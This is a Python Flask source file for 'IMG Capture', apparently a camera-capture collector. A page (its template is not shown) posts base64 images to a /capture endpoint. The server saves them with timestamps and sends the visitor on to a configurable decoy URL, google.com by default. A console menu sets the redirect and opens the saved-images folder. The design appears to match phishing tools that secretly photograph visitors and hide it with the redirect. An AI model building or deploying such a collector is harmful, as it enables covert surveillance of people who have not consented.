from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
import os
import json
import webbrowser
import platform
import subprocess
from datetime import datetime
import base64

app = Flask(__name__)

CONFIG_FILE = 'config.json'
CAPTURED_IMG_DIR = 'captured_img'

if not os.path.exists(CAPTURED_IMG_DIR):
    os.makedirs(CAPTURED_IMG_DIR)

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {'redirect_url': 'https://www.google.com', 'first_launch': True}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def open_folder():
    system = platform.system()
    if system == "Windows":
        subprocess.run(['explorer', CAPTURED_IMG_DIR])
    elif system == "Darwin":  # macOS
        subprocess.run(['open', CAPTURED_IMG_DIR])
    else:  
        subprocess.run(['xdg-open', CAPTURED_IMG_DIR])

@app.route('/')
def index():
    config = load_config()
    return render_template('index.html', redirect_url=config['redirect_url'])

@app.route('/capture', methods=['POST'])
def capture_media():
    try:
        data = request.get_json()
        image_data = data.get('image')
        
        if image_data:
            if image_data.startswith('data:image'):
                image_data = image_data.split(',')[1]
            
            image_bytes = base64.b64decode(image_data)
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'capture_{timestamp}.png'
            filepath = os.path.join(CAPTURED_IMG_DIR, filename)
            
            with open(filepath, 'wb') as f:
                f.write(image_bytes)
            
            return jsonify({'success': True, 'filename': filename})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    
    return jsonify({'success': False, 'error': 'No image data received'})

@app.route('/update_url', methods=['POST'])
def update_url():
    config = load_config()
    new_url = request.form.get('url')
    if new_url:
        config['redirect_url'] = new_url
        save_config(config)
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'No URL provided'})

@app.route('/open_folder')
def open_images_folder():
    open_folder()
    return jsonify({'success': True})

def main_menu():
    config = load_config()
    if config['first_launch']:
        print("=" * 50)
        print("IMG Capture - First Time Setup")
        print("Tool by CLPdevOfficial")
        print("=" * 50)
        print("Welcome to IMG Capture!")
        print("This is your first time running the application.")
        print()
        url = input("Enter the URL to redirect to after capture: ").strip()
        if url:
            config['redirect_url'] = url
            config['first_launch'] = False
            save_config(config)
            print(f"✅ URL set to: {url}")
        else:
            print("Using default URL: https://www.google.com")
            config['first_launch'] = False
            save_config(config)
    while True:
        print("\n" + "=" * 50)
        print("IMG Capture")
        print("=" * 50)
        print("1. Launch application (start server)")
        print("2. Open saved images folder")
        print("3. Change redirect URL")
        print("4. Exit")
        print()
        choice = input("Enter your choice (1-4): ").strip()
        if choice == '1':
            print("\nStarting IMG Capture server...")
            print("Open your browser and go to: http://localhost:5000")
            print("The app will capture media and redirect to:", config['redirect_url'])
            print("Press Ctrl+C to stop the server")
            print()
            webbrowser.open('http://localhost:5000')
            try:
                app.run(debug=True, host='127.0.0.1', port=5000, use_reloader=False)
            except KeyboardInterrupt:
                print("\nServer stopped.")
            break
        elif choice == '2':
            print("Opening captured images folder...")
            open_folder()
        elif choice == '3':
            print("\nCurrent redirect URL:", config['redirect_url'])
            new_url = input("Enter new redirect URL: ").strip()
            if new_url:
                config['redirect_url'] = new_url
                save_config(config)
                print("✅ URL updated successfully!")
            else:
                print("❌ No URL provided.")
        elif choice == '4':
            print("Closing tool...")
            break
        else:
            print("❌ Invalid choice. Please enter 1-4.")

if __name__ == '__main__':
    main_menu()
